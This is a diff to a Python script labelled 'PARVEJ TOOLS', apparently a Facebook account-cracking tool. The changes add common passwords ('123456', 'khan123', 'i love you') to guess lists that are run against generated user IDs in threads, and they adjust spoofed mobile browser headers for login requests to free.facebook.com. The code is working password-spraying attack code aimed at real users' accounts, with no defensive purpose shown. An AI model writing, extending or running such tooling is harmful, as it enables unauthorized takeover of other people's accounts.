@@ -166,12 +166,12 @@ os.system('clear')
 
 #-------------------mylover-------------------#
 logo="""
-\033[1;92m
-\033[0;35m██████   █████  ██████  ██    ██ ███████      ██ 
-\033[0;35m██   ██ ██   ██ ██   ██ ██    ██ ██           ██ 
-\033[0;34m██████  ███████ ██████  ██    ██ █████        ██ 
-\033[0;36m██      ██   ██ ██   ██  ██  ██  ██      ██   ██ 
-\033[0;36m██      ██   ██ ██   ██   ████   ███████  █████  
+\033[1;37m8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;32m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;37m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;32m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;37m88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;32m88      YP   YP 88   YD    YP    Y88888P Y8888P  
 
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
 
@@ -316,7 +316,7 @@ def C2():
         print(f"\033[1;92m[\033[1;34m●\033[1;92m]\033[0;92mSTART TIME     \033[1;34m: \033[0;97m{ha}/{bu}/{ta} ~ {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
         print(f"\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;30mPARVEJ\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●  ")
         for love in user:
-            pwx = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','ilove you','freefire']
+            pwx = [love,love[2:],love[1:],code+love,code+love[:3],'bangladesh','ilove you','freefire','khan123','@#@#@#','123456','Bangladesh']
             uid = code+love
             PARVEJ.submit(rcrack1,uid,pwx,tl)
     print(' CRACK PROCESS HAS BEEN COMPLETED ')
@@ -439,7 +439,7 @@ def C3():
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','@@@@@','najmul123','najmul1234','najmul@@']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','@@@@@','najmul123','najmul1234','najmul@@','free fire','khan123','123456','i love you']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(50*'_')
     print(' [\033[1;92m\033[1;34m✔\033[1;92m] Crack process has been completed')
@@ -469,13 +469,11 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'free.facebook.com',
-   'method':'GET',
-   'scheme':'https',
-   'path':'/?zero_e=3&zero_et=1680085301&_rdc=1&_rdr&refsrc=deprecated',
-   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'method':'GET',
+    'scheme':'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-   'referer': 'https://free.facebook.com/',
     'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
